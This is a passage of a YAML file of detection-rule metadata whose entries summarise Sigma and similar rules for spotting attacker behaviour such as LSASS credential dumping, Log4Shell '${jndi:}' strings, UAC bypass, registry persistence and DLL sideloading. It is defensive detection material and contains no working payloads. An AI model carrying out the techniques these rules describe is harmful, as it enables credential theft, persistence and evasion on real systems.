    process whose image name contains the keyword "dump." The LSASS process (Local
    Security Authority Subsystem Service) is crucial for handling security-related
    tasks on Windows systems, and inappropriate access to this process can indicate
    credential dumping activities by malicious actors. The rule specifically checks
    for various granted access permissions indicating potential credential theft attempts.
  Updated-Date: '2024_09_03'
9bd04a79-dabe-4f1f-a5ff-92430265c96b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6c99eba04b97b2521fcad59c7503b11a
  Ruleset: core
  Summary: This rule detects attempts at privilege escalation via named pipe impersonation
    in Windows environments. It focuses on the creation processes specifically related
    to `cmd.exe` or `powershell.exe`, and checks for command lines that involve the
    `echo` command followed by redirection to a named pipe path (`\\\\.\\pipe\\`).
    This activity may indicate malicious behavior, such as lateral movement or data
    staging.
  Updated-Date: '2024_09_03'
9be34ad0-b6a7-4fbd-91cf-fc7ec1047f5f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6d1a617e0cb22c57aedd70f65cc226b2
  Ruleset: emerging-threats
  Summary: This rule detects process creation patterns associated with UNC2452 activity,
    particularly processes initiated by 7z.exe that include specific command line
    parameters indicative of file archiving with encryption and volumes, often seen
    with .zip extensions and either .txt or .log files. It also identifies suspicious
    parent-child process relationships involving wscript.exe running .vbs scripts
    that subsequently initiate rundll32.exe with certain DLL files, as well as instances
    where rundll32.exe spawns cmd.exe executing commands within the Windows directory.
    Additionally, it monitors for rundll32.exe acting as a parent to dllhost.exe with
    empty command lines, which is atypical and potentially indicative of malicious
    activity.
  Updated-Date: '2024_09_03'
9be472ed-893c-4ec0-94da-312d2765f654:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8a41c369b7244c63ce8d492ac84ff758
  Ruleset: emerging-threats
  Summary: This rule detects attempts to exploit the Log4j Remote Code Execution (RCE)
    vulnerability, CVE-2021-44228, also known as Log4Shell, in various header fields
    within web server logs. The detection mechanism looks for specific patterns indicative
    of exploitation attempts, including those referencing the ${jndi:} syntax commonly
    used in the attack payloads. The rule examines fields like the user-agent, URI-query,
    and referer headers for these patterns, which can signify an attempt to inject
    malicious code through the vulnerable Log4j logging library. This vulnerability
    is a critical issue in the Log4j library, impacting numerous applications and
    systems that utilize it for logging purposes.
  Updated-Date: '2024_09_03'
9c0295ce-d60d-40bd-bd74-84673b7592b1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0bc3505fae3d0771b2cf0fef1ede6373
  Ruleset: core
  Summary: This rule detects suspicious instances of base64 encoded and obfuscated
    "LOAD" keywords within the .NET framework's "reflection.assembly" function. The
    detection focuses on identifying encoded variations of the "LOAD" command, which
    may indicate an attempt to evade security mechanisms. The rule particularly scrutinizes
    process creation logs on Windows systems, looking for specific encoded patterns
    in command lines that reflect potentially malicious activity, such as encoding
    and obfuscation typically used by malware like REvil (Sodinokibi) in their evasion
    techniques.
  Updated-Date: '2024_09_03'
9c14c9fa-1a63-4a64-8e57-d19280559490:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 292fdfc02b0eb83ac8c31cb2ebba39c0
  Ruleset: core
  Summary: This rule detects the use of obfuscated PowerShell commands executed via
    standard input (stdin) in scripts, which is indicative of attempts to evade defenses
    and execute malicious code. The detection focuses on specific patterns in the
    command line that suggest the manipulation of environment variables and the invocation
    of potentially obfuscated script input. This technique is often used by attackers
    to bypass security controls and perform unauthorized actions on Windows systems.
  Updated-Date: '2024_09_03'
9c226817-8dc9-46c2-a58d-66655aafd7dc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c07cc0ad991d83f81c3981351a8014f7
  Ruleset: core
  Summary: This rule detects the modification of the startup key in the Windows registry
    to a path where a payload could be stored and subsequently launched during system
    startup. The specific registry keys targeted are within 'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User
    Shell Folders' and include entries that end with 'Startup'. This behavior can
    indicate attempts to establish persistence or elevate privileges by setting up
    malicious software to execute automatically when the computer starts.
  Updated-Date: '2024_09_03'
9c5037d1-c568-49b3-88c7-9846a5bdc2be:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 972f8bd6f82cb2f20d385c02d1d350ea
  Ruleset: core
  Summary: This rule detects suspicious RUN keys created by software located in the
    Downloads or temporary directories of Outlook and Internet Explorer on Windows
    systems. It focuses on identifying registry events where the image path of the
    executable contains patterns like '\Downloads\', '\Temporary Internet Files\Content.Outlook\',
    or '\Local Settings\Temporary Internet Files\', paired with target objects containing
    '\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\'. This detection aims to uncover
    potential persistence mechanisms leveraged by malicious software.
  Updated-Date: '2024_09_03'
9c7e131a-0f2c-4ae0-9d43-b04f4e266d43:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 828d793f624b9a27a20184d66a3f0b21
  Ruleset: sigmahq
  Summary: This rule detects uncommon child processes generated by Appvlp.EXE, which
    is the Application Virtualization Utility included with Microsoft Office. While
    Appvlp.EXE is normally used for application virtualization, it can be exploited
    by attackers to execute shell commands, circumvent certain security rules, or
    mark a file as a system file. The rule aims to identify unusual activity that
    deviates from its typical usage.
  Updated-Date: '2024_09_04'
9c8acf1a-cbf9-4db6-b63c-74baabe03e59:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 53f1600cea2cd36c4990092182232fa5
  Ruleset: sigmahq
  Summary: This rule detects potential NTLM brute force attacks by identifying specific
    device names associated with common brute force tools or tactics. It monitors
    Windows NTLM logs for EventID 8004, and flags activity from workstations with
    names such as 'Rdesktop,' 'Remmina,' 'Freerdp,' and various Windows versions including
    'Windows7,' 'Windows8,' 'Windows2012,' 'Windows2016,' and 'Windows2019.' The rule
    aims to uncover unauthorized attempts to gain access through repeated NTLM authentication
    attempts using these-known device names.
  Updated-Date: '2024_09_04'
9c8c7000-3065-44a8-a555-79bcba5d9955:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e89235fb6c041493c537414bd1dcf4dc
  Ruleset: core
  Summary: This rule detects the execution of "msdt.exe" using an answer file, which
    mimics a legitimate method of invoking msdt via "pcwrun.exe," typically originating
    from the compatibility tab. This detection focuses on identifying specific command-line
    arguments associated with the answer file usage and ensures that the process is
    not initiated by "pcwrun.exe" to reduce false positives.
  Updated-Date: '2024_09_03'
9ca2bf31-0570-44d8-a543-534c47c33ed7:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b94461c5a0be99532bc466f73fd97288
  Ruleset: sigmahq
  Summary: This rule detects the loading of "dbgcore.dll" from non-standard directories,
    which is a technique often used in DLL sideloading attacks. DLL sideloading involves
    substituting a malicious DLL in place of a legitimate one, attempting to exploit
    applications to execute the malicious code with elevated privileges. Specific
    filters are applied to exclude common, legitimate paths where "dbgcore.dll" is
    typically found, such as directories under "C:\Program Files" and "C:\Windows,"
    as well as paths related to Steam applications. The detection aims to identify
    potentially malicious activity while minimizing false positives from legitimate
    software loading their own versions of the DLL.
  Updated-Date: '2024_09_04'
9cae055f-e1d2-4f81-b8a5-1986a68cdd84:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fc831cfabcd6d7422c9356780c722292
  Ruleset: emerging-threats
  Summary: This rule detects the creation of a suspicious ".hta" file in the startup
    folder by Foxit Reader, which may indicate the exploitation of CVE-2023-27363.
    This vulnerability in Foxit Reader can be leveraged to execute arbitrary code,
    potentially leading to unauthorized system access or persistence mechanisms being
    established within the startup directory. The rule aims to identify instances
    where FoxitPDFReader.exe is creating files with an ".hta" extension specifically
    within the Windows Start Menu's startup programs folder, signaling a possible
    security threat that should be investigated promptly.
  Updated-Date: '2024_09_03'
9cc85849-3b02-4cb5-b371-3a1ff54f2218:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f427db82ad4961086b0897e2e88fa518
  Ruleset: sigmahq
  Summary: This rule detects file downloads directly from IP address URLs using curl.exe
    on Windows systems. It focuses on identifying instances where the curl.exe utility
    is executed with command line arguments that include an IP address and specific
    download flags like '-O', '--remote-name', or '--output'. The rule filters out
    certain file extensions to prevent duplication.
  Updated-Date: '2024_09_04'
9ccba514-7cb6-4c5c-b377-700758f2f120:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f1ade127ae25810b416278966cbd5232
  Ruleset: core
  Summary: This rule detects potentially suspicious child processes stemming from
    the execution of "aspnet_compiler.exe" on Windows systems. "aspnet_compiler.exe"
    is a binary associated with ASP.NET, commonly used to precompile ASP.NET applications.
    The detection focuses on identifying unusual child processes that are spawned
    by this executable, such as "calc.exe" or "notepad.exe," as well as processes
    that run from atypical directories like "\Users\Public\", "\AppData\Local\Temp\",
    "\AppData\Roaming\", "\Temp\", "\Windows\Temp\", "\Windows\System32\Tasks\", and
    "\Windows\Tasks\".
  Updated-Date: '2024_09_03'
9cfc00b6-bfb7-49ce-9781-ef78503154bb:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d9de1e9a336f6f1343cbd84c60426bc2
  Ruleset: sigmahq
  Summary: This rule detects the execution of "Wlrmdr.exe" with the "-u" command line
    flag, which allows any input to be passed as an argument to the ShellExecute API,
    enabling an attacker to execute arbitrary binaries. Additionally, it identifies
    any uncommon child processes spawned from "Wlrmdr.exe", providing supplementary
    detection for environments with "ParentImage" telemetry.
  Updated-Date: '2024_09_04'
9d15044a-7cfe-4d23-8085-6ebc11df7685:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 69b1c8dae763cc8ef5d56b6be20c960c
  Ruleset: sigmahq
  Summary: This rule detects attempts to establish persistence through Visual Studio
    Tools for Office (VSTO) add-ins within Microsoft Office applications. The detection
    is based on identifying registry modifications that indicate the presence of add-ins
    for Outlook, Word, Excel, and PowerPoint, as well as inclusions related to VSTO
    security. Specific executables such as msiexec.exe and regsvr32.exe are excluded
    from triggering alerts to reduce false positives from legitimate software installations.
    Monitoring these registry changes helps in identifying potentially unauthorized
    persistence mechanisms leveraged by malicious actors.
  Updated-Date: '2024_09_04'
9d3436ef-9476-4c43-acca-90ce06bdf33a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 403df506bfbefe5a3c8625a038a4b66c
  Ruleset: core
  Summary: This rule detects the installation of a Callout DLL through the modification
    of the Registry entries CalloutDlls and CalloutEnabled within the DHCP server
    parameters. This activity can be indicative of an attempt to execute code within
    the context of the DHCP server, which requires a server restart.
  Updated-Date: '2024_09_03'
9d4548fa-bba0-4e88-bd66-5d5bf516cda0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3323d4cedd2c088fcd6fc5142a0a5f83
  Ruleset: sigmahq
  Summary: This rule detects attempts to masquerade processes as the legitimate Linux
    `crond` process. Masquerading involves altering the name or location of an executable,
    either legitimate or malicious, to evade defenses and remain unnoticed. The detection
    focuses on the `execve` syscall where `cp` is used in conjunction with `/bin/sh`
    and a target that ends with `/crond`. This behavior indicates a potential evasion
    attempt by manipulating process names to blend in with legitimate system processes.
  Updated-Date: '2024_09_04'
9d5a1274-922a-49d0-87f3-8c653483b909:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 34118d39d4278b2d5ad92bde281ba2f6
  Ruleset: sigmahq
  Summary: This rule detects the use of the WMI command-line (WMIC) utility to gather
    and display various system information, such as OS details, CPU and GPU information,
    disk drive names, memory capacity, display resolution, and information about the
    baseboard, BIOS, and GPU driver products/versions. Notably, some of these commands
    were employed by the Aurora Stealer malware in late 2022 and early 2023.
  Updated-Date: '2024_09_04'
9d7ca793-f6bd-471c-8d0f-11e68b2f0d2f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 12cbb3dd002767f930afeefd2e8dac8d
  Ruleset: sigmahq
  Summary: This rule detects the execution of the `wmic.exe` utility with the "computersystem"
    flag to obtain detailed information about the machine, including the domain, username,
    and model.
  Updated-Date: '2024_09_04'
9d8f9bb8-01af-4e15-a3a2-349071530530:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fac7c020bb57bfc13ae2954508b72f14
  Ruleset: sigmahq
  Summary: This rule detects the use of the Windows Input Method Editor (IME) keyboard
    layout feature, which can be exploited by attackers to load a DLL into a process
    after sending the WM_INPUTLANGCHANGEREQUEST message. To achieve this, the attacker
    must first register the DLL in a specific registry key that is expected to represent
    a keyboard layout. This registry key should store a value named "Ime File" that
    contains the DLL path. IMEs are crucial for languages with more characters than
    a standard keyboard can accommodate, such as Chinese, Japanese, and Korean. The
    rule focuses on identifying suspicious DLL paths within certain directories like
    '\Perflogs\', '\Users\Public\', '\Windows\Temp\', '\AppData\Local\Temp\', '\AppData\Roaming\',
    and '\Temporary Internet\', as well as specific subdirectories within user profiles
    like '\Favorites\', '\Favourites\', and '\Contacts\'.
  Updated-Date: '2024_09_04'
9db37458-4df2-46a5-95ab-307e7f29e675:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 610f0547c39716eb8a32c0e8d4b5cd25
  Ruleset: core
  Summary: This rule detects an adversary setting the OabVirtualDirectory External
    URL property to a script in the Exchange Management log. This activity could indicate
    a malicious attempt to manipulate the configuration of the Offline Address Book
    (OAB) virtual directory for persistence or further exploitation in a Microsoft
    Exchange environment.
  Updated-Date: '2024_09_03'
9db5446c-b44a-4291-8b89-fcab5609c3b3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0a9bcee85232ed1cfe011350dde68032
  Ruleset: sigmahq
  Summary: This rule detects instances where a VNC service on an OpenCanary node has
    had a connection attempt. OpenCanary is a honeypot application designed to emulate
    various services to detect malicious activity on a network. The detection is based
    on logs indicating an attempted VNC service connection, which could signal a potential
    lateral movement effort by an attacker. Given the high level of significance,
    it is unlikely for this activity to be a false positive.
  Updated-Date: '2024_09_04'
9df0dd3a-1a5c-47e3-a2bc-30ed177646a0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 56ee072f174d87dd923c0b2a964c5eb3
  Ruleset: sigmahq
  Summary: This rule detects attempts to execute code or create a service on a remote
    host using the "winrm.vbs" script. It specifically looks for processes named "cscript.exe"
    that are running command lines containing terms related to "winrm" and "invoke
    Create wmicimv2/Win32_" with an HTTP protocol specification. This detection method
    helps in identifying potential malicious activities involving Windows Remote Management
    (WinRM) as a means for code execution.
  Updated-Date: '2024_09_04'
9df5f547-c86a-433e-b533-f2794357e242:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 375989a1a0312ccd00a00a2b8cad5a41
  Ruleset: sigmahq
  Summary: This rule detects modifications of autostart extensibility points (ASEP)
    in the Windows registry, specifically targeting keys under the `\Software\Classes`
    path. It focuses on changes related to shell extension handlers, drag-and-drop
    handlers, command execution for `.exe` and `.cmd` files, and other related registry
    entries. The rule incorporates filters to exclude processes such as `drvinst.exe`
    and `svchost.exe` to reduce false positives. The presence of these modifications
    can indicate attempts to establish persistence by software or malware.
  Updated-Date: '2024_09_04'
9e07f6e7-83aa-45c6-998e-0af26efd0a85:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fd900834f597693864433b6446e2b342
  Ruleset: sigmahq
  Summary: This rule detects the execution of potentially malicious PowerShell scripts
    that use Windows Management Instrumentation (WMI) to establish persistence on
    a system. Adversaries may exploit WMI event subscriptions to execute unauthorized
    content with elevated privileges. The detection is focused on identifying specific
    script blocks that create new instances within the WMI subscription namespace,
    particularly those that involve creating `__EventFilter` or `CommandLineEventConsumer`
    classes.
  Updated-Date: '2024_09_04'
9e099d99-44c2-42b6-a6d8-54c3545cab29:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: aa5d7455ec396936c89d3fd43a088bb6
  Ruleset: core
  Summary: This rule detects the creation of specific files associated with the Mimikatz
    tool, such as files with extensions like ".kirbi" and logs like "mimilsa.log".
    These files are related to credential access attacks, specifically those targeting
    Kerberos tickets and Memory Security Support Provider (MemSSP) log files. Mimikatz
    is a well-known post-exploitation tool used for extracting various credentials
    and performing actions such as pass-the-hash and Kerberoasting attacks. The detection
    focuses on monitoring Windows file events to identify the presence of these tell-tale
    files, indicating potential unauthorized access and credential dumping activities.
  Updated-Date: '2024_09_03'
9e2575e7-2cb9-4da1-adc8-ed94221dca5e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e823f993e188208f1ff781338eb83d47
  Ruleset: sigmahq
  Summary: This rule detects the addition of a new rule to the Windows Firewall exception
    list for an application situated in potentially suspicious directories. It targets
    Event IDs 2004, 2071, and 2097 on Windows 10 and Windows 11 systems and specifically
    looks for application paths involving temporary files and common system directories
    such as '\PerfLogs\', '\Temp\', '\Tmp\', '\Users\Public\', '\Windows\Tasks\',
    '\Windows\Temp\', and '\AppData\Local\Temp\'. This monitoring aims to identify
    unauthorized or unusual modifications to firewall settings, which could indicate
    a defense evasion tactic by malware or other malicious software.
  Updated-Date: '2024_09_04'
9e2e51c5-c699-4794-ba5a-29f5da40ac0c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bc43c6737baa9075529908d9a93cea3f
  Ruleset: emerging-threats
  Summary: This rule detects specific command-line activities associated with the
    Turla group, a well-known cyber-espionage group. The detection focuses on commands
    reported by ESET in May 2020 that serve as indicators of their malicious activities.
    These commands include network diagnostics, obfuscated PowerShell scripts, and
    encoded strings, as well as the use of network drives and specific email addresses.
    The goal is to identify potentially harmful behaviors indicative of Turla's presence
    in a Windows-based environment.
  Updated-Date: '2024_09_03'
9e3357ba-09d4-4fbd-a7c5-ad6386314513:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 20611155190a1d90a5408664dbdb6195
  Ruleset: core
  Summary: This rule detects potential persistence mechanisms in Windows environments
    by monitoring for modifications to the registry that indicate a change in the
    loaded Fax DLL when the Fax service is restarted. This type of activity may signal
    an attempt to evade defenses by exploiting the Fax service for malicious purposes.
    The rule specifically looks for alterations involving the `\Software\Microsoft\Fax\Device
    Providers\` registry path and changes to the `ImageName` attribute while excluding
    the legitimate `fxst30.dll` file typically found in Windows 10 systems.
  Updated-Date: '2024_09_03'
9e36ed87-4986-482e-8e3b-5c23ffff11bf:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9ed2215d620c65da9bb692f2876b4530
  Ruleset: sigmahq
  Summary: This rule detects events related to the installation and execution of the
    RemCom service on Windows systems. RemCom is a remote command-line tool that allows
    administrators to execute commands on remote machines. The rule specifically identifies
    log entries generated by the Service Control Manager with Event ID 7045, indicating
    the creation of a new service named 'RemComSvc' or the execution of its associated
    executable file, 'RemComSvc.exe'.
  Updated-Date: '2024_09_04'
9e3cb244-bdb8-4632-8c90-6079c8f4f16d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cb29b2d4a5e17c802e241cfdfd97e4c2
  Ruleset: core
  Summary: This rule detects attempts by adversaries to disable critical system services
    or processes by deleting scheduled tasks associated with those services. This
    activity is often part of data destructive efforts. Specifically, it looks for
    deletions of scheduled tasks related to System Restore, Windows Defender, BitLocker,
    Windows Backup, Windows Update, the Update Orchestrator, and Exploit Guard. The
    detection is focused on a specific Windows EventID (141) and excludes specific
    user names to reduce false positives.
  Updated-Date: '2024_09_03'
9e50a8b3-dd05-4eb8-9153-bdb6b79d50b0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 02790fd2b05f428274b86124bde2c00f
  Ruleset: sigmahq
  Summary: This rule detects the execution of MSXSL, a utility used to execute Extensible
    Stylesheet Language (XSL) files, which are commonly used for processing and rendering
    data in XML files. Adversaries can exploit this tool to run arbitrary files, potentially
    bypassing application whitelisting defenses.
  Updated-Date: '2024_09_04'
9e620995-f2d8-4630-8430-4afd89f77604:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c501eec7b493eea8409dac220eb12950
  Ruleset: sigmahq
  Summary: This rule detects the usage of the "Import-Module" cmdlet to load the "Microsoft.ActiveDirectory.Management.dll"
    DLL, which is commonly leveraged by attackers to conduct Active Directory (AD)
    enumeration. The presence of this activity can indicate an attempt to gather information
    about the AD environment, often part of reconnaissance or discovery phases in
    an attack. Detection relies on monitoring PowerShell script blocks for specific
    text patterns associated with importing this module. Legitimate administrative
    use of this library may generate false positives.
  Updated-Date: '2024_09_04'
9e716b33-63b2-46da-86a4-bd3c3b9b5dfb:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8094b5bddb9afc2fa02bb58ebd4b5d01
  Ruleset: sigmahq
  Summary: This rule detects the use of PowerShell cmdlets to export certificates
    from the local certificate store. Threat actors may exploit this technique to
    steal private keys from compromised systems. The detection involves monitoring
    command lines containing 'Export-PfxCertificate' or 'Export-Certificate'.
  Updated-Date: '2024_09_04'
9e8f6035-88bf-4a63-96b6-b17c0508257e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 38304530cd5bd92d73be465b6ba6a45a
  Ruleset: core
  Summary: This rule detects attempts to disable logging, either locally or remotely,
    on Cisco devices. It looks for specific commands such as "no logging" and "no
    aaa new-model" which indicate logging is being turned off. The rule monitors various
    fields including source, command set, user, privilege level, and remote address
    to help identify unauthorized changes to the logging configuration. This activity
    could suggest attempts to evade security measures and bypass logging mechanisms.
  Updated-Date: '2024_09_03'
9e987c6c-4c1e-40d8-bd85-dd26fba8fdd6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 83aa9ce2a0eeed6aa2012de067380413
  Ruleset: emerging-threats
  Summary: This rule detects the installation of a malicious service named "Microsoft
    Network Realtime Inspection Service," which is associated with the StoneDrill
    malware reported by Kaspersky. It monitors for events generated by the Service
    Control Manager on Windows systems, specifically looking for Event ID 7045 where
    the service name is "NtsSrv" and the image path ends with "LocalService."
  Updated-Date: '2024_09_03'
9e9a9002-56c4-40fd-9eff-e4b09bfa5f6c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 13c810dead33342c7ad39f369069561b
  Ruleset: sigmahq
  Summary: This rule detects when a system process based in directories like system32
    or syswow64 loads a DLL from a suspicious or commonly permissive location, such
    as "C:\Users\Public". This behavior might indicate an attempt at defense evasion
    or unauthorized access, as legitimate system processes typically do not load DLLs
    from such directories.
  Updated-Date: '2024_09_04'
9eb68894-7476-4cd6-8752-23b51f5883a7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e6cc40a9232e73f24e6cec2582ea2533
  Ruleset: core
  Summary: This rule detects Bitsadmin connections to domains with uncommon top-level
    domains (TLDs). Bitsadmin is a command-line tool that creates download or upload
    jobs and monitors their progress. The rule triggers when a user agent starting
    with 'Microsoft BITS/' makes a connection, and the target domain's TLD does not
    match common ones like .com, .net, .org, or known specialized domains. This is
    indicative of potential command-and-control communication, defense evasion, or
    persistence methods used in cyber attacks. However, it accounts for legitimate
    traffic, including updates from domains like Spotify and Microsoft's own domains.
  Updated-Date: '2024_09_03'
9eb99343-d336-4020-a3cd-67f3819e68ee:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b5e5e6a7e3e34e113bc95cb40245d982
  Ruleset: sigmahq
  Summary: This rule detects suspicious activity and tampering with accounts that
    have been disabled or restricted by identifying uncommon error codes on failed
    logon attempts in a Windows environment. It monitors for specific Event IDs (4625,
    4776) and status codes indicating issues like logons to disabled accounts, attempts
    outside authorized hours, from unauthorized workstations, or failures due to authentication
    firewalls and broken trust relationships between domains.
  Updated-Date: '2024_09_04'
9ec9fb1b-e059-4489-9642-f270c207923d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dfcf9f5b0d0376a2e927f4bb41095af1
  Ruleset: sigmahq
  Summary: This rule detects changes made to the Windows registry key "HKLM\Software\Microsoft\Windows
    NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" where a value is set to "0,"
    a method commonly used to hide user accounts from the logon screen. The detection
    focuses on command-line activity involving 'reg.exe' with specific parameters
    that indicate the modification of this registry key. Such behavior could be indicative
    of an attempt to conceal user accounts and is monitored to identify potential
    unauthorized modifications.
  Updated-Date: '2024_09_04'
9ed5959a-c43c-4c59-84e3-d28628429456:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cf70fd13cfa8713becfa4744fd70c8ea
  Ruleset: core
  Summary: "This rule detects the UAC (User Account Control) bypass technique that\
    \ utilizes the executable \"iscsicpl.exe.\" This method exploits DLL Search Order\
    \ hijacking to load custom DLLs from temporary or user-controlled locations within\
    \ the user\u2019s %PATH%. The detection focuses on the presence of \"iscsicpl.exe\"\
    \ and monitoring the loading of \"iscsiexe.dll\" from non-system directories,\
    \ aiming to identify unauthorized or malicious privilege escalation attempts.\
    \ References highlight how this technique is implemented and discussed within\
    \ the cybersecurity community."
  Updated-Date: '2024_09_03'
9ee1021c-be7f-453d-81e8-8539403a2c5d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 93fbd660a3c705ece23738fb940575d6
  Ruleset: securityonion-resources
  Summary: This rule detects attempted login activities to the MySQL service on a
    Security Onion Intrusion Detection Honeypot (IDH) node through a proxy. Identifying
    such attempts is crucial for recognizing unauthorized access or potential threats
    targeting the MySQL service within a honeypot environment. The detection mechanism
    leverages specific log entries associated with MySQL login attempts, ensuring
    precise identification of the events.
  Updated-Date: '2024_08_07'
9ef27c24-4903-4192-881a-3adde7ff92a5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 901629c2b477736c5941ac04ddadb21a
  Ruleset: sigmahq
  Summary: This rule detects the execution of a renamed Remote Utilities Remote Access
    Trojan (RURAT) by identifying the 'Product' field in the PE (Portable Executable)
    header. It focuses on Windows process creation logs and excludes specific file
    names such as 'rutserv.exe' and 'rfusclient.exe' that might be legitimate instances.
    The purpose is to catch scenarios where the Remote Utilities RAT is used for defense
    evasion, collection, command-and-control, or discovery activities.
  Updated-Date: '2024_09_04'
9f0a8bf3-a65b-440a-8c1e-5cb1547c8e70:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c7a756953f4d06ec8cb4179380b20d8f
  Ruleset: sigmahq
  Summary: This rule detects the execution of `odbcconf.exe` with the `REGSVR` command
    to register a new DLL. Attackers may exploit this method to install and run malicious
    DLLs, bypassing standard security measures. Monitoring this activity helps identify
    potential unauthorized actions where `odbcconf` is used illegitimately. Legitimate
    DLL registrations through `odbcconf` may generate false positives, requiring further
    investigation into the DLL path and content to verify authorization.
  Updated-Date: '2024_09_04'
9f107a84-532c-41af-b005-8d12a607639f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6546347480056ab50186a069521a648f
  Ruleset: sigmahq
  Summary: This rule detects the expansion or decompression of cabinet files using
    'expand.exe' from potentially suspicious or uncommon locations on a Windows system.
    Such activity can be indicative of malicious behavior, including attacks such
    as those related to Iranian MeteorExpress. The rule specifically monitors for
    command executions in directories like 'Perflogs', 'Users\Public', 'Temporary
    Internet', 'ProgramData', 'AppData\Local\Temp', 'AppData\Roaming\Temp', and 'Windows\Temp',
    as well as within user directories like 'Favorites', 'Favourites', and 'Contacts'.
    It filters out benign activity like those initiated by Dell's ServiceShell.exe
    from the Dell Update Service.
  Updated-Date: '2024_09_04'
9f2cc74d-78af-4eb2-bb64-9cd1d292b87b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cd40343cd7d1892c74b4824d10fc13ce
  Ruleset: sigmahq
  Summary: This rule detects suspicious network connections initiated by Microsoft
    Sync Center, specifically targeting connections to non-private IP addresses. Microsoft
    Sync Center, running as `mobsync.exe`, is a Windows feature used to synchronize
    files between a computer and network locations or external devices. The rule is
    designed to flag network activity from `mobsync.exe` communicating outside of
    recognized local or private IP ranges, which could indicate potential misuse or
    a security risk.
  Updated-Date: '2024_09_04'
9f308120-69ed-4506-abde-ac6da81f4310:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c89d7e5d3145b736a409a907a4d05c44
  Ruleset: sigmahq
  Summary: This rule detects when a Network Zone within Okta is either deactivated
    or deleted. Network Zones in Okta are used to define security policies and access
    controls based on the geographical location and network of the users. Monitoring
    these events is crucial to ensure that any changes to Network Zones, whether intentional
    or accidental, are promptly identified and addressed to maintain security integrity.
  Updated-Date: '2024_09_04'
9f383dc0-fdeb-4d56-acbc-9f9f4f8f20f3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2b82243ff25946f6d755a69dc3a8f4eb
  Ruleset: core
